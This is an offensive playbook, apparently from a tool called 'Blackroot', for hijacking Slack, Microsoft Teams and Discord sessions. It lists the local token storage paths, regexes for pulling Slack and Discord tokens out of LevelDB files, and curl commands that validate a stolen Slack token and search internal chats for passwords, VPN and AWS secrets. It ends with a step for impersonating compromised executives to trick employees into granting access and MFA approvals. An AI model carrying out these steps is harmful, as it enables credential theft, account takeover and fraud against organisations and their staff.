# Playbook: Electron Session Hijacking & Corporate Chat Exfiltration

## 1. Overview
* **Artifact Type**: `electron_session_token`
* **Base Value**: 140 ROOT
* **Severity**: Critical
* **Prerequisites**: User-level read access to local user profile directories.

Modern enterprise communications and ops tools (Slack, Microsoft Teams, Discord, TradingView) run on the Electron framework (Chromium + Node.js runtime). Their session persistence is maintained in local LevelDB stores rather than encrypted OS credential vaults.

---

## 2. Artifact Paths & Target Locations
* **Slack**:
  - `%APPDATA%\Slack\Local Storage\leveldb\`
  - `%APPDATA%\Slack\Network\Cookies`
  - `%APPDATA%\Slack\Partitions\slack\Local Storage\leveldb\`
* **Microsoft Teams**:
  - `%APPDATA%\Microsoft\Teams\Local Storage\leveldb\`
* **Discord**:
  - `%APPDATA%\discord\Local Storage\leveldb\`

---

## 3. Token Signatures & Extraction

Blackroot inspects `.ldb` and `.log` files in LevelDB directories using pure-binary regex scanning:
- **Slack User Token**: `xoxp-[0-9]{10,13}-[0-9]{10,13}-[0-9]{10,13}-[a-f0-9]{32}`
- **Slack Bot Token**: `xoxb-[0-9]{10,13}-[0-9]{10,13}-[a-zA-Z0-9]{24}`
- **Slack Client Token / Cookie**: `xoxc-...` and cookie `d=xoxd-...`
- **Discord Token**: `[A-Za-z0-9_-]{24}\.[A-Za-z0-9_-]{6}\.[A-Za-z0-9_-]{27}`

---

## 4. Abuse & Pivot Workflow

### Step 1: Session Validation & User Profiling
Validate the captured token against the vendor API:
```bash
# Slack token test
curl -s -H "Authorization: Bearer xoxp-..." https://slack.com/api/auth.test
```
This returns the team name, user ID, and authenticated identity.

### Step 2: Internal Conversation & Secret Search
Enumerate channels and search internal chats for credentials, credentials shared in `#dev` or `#it-support`:
```bash
# Search for secrets posted in chat
curl -s -H "Authorization: Bearer xoxp-..." "https://slack.com/api/search.messages?query=password"
curl -s -H "Authorization: Bearer xoxp-..." "https://slack.com/api/search.messages?query=vpn"
curl -s -H "Authorization: Bearer xoxp-..." "https://slack.com/api/search.messages?query=aws"
```

### Step 3: Social Engineering & Internal Impersonation
Directly send messages from the compromised executive or admin user to employees (e.g. requesting emergency access, code approvals, or multi-factor token approvals).
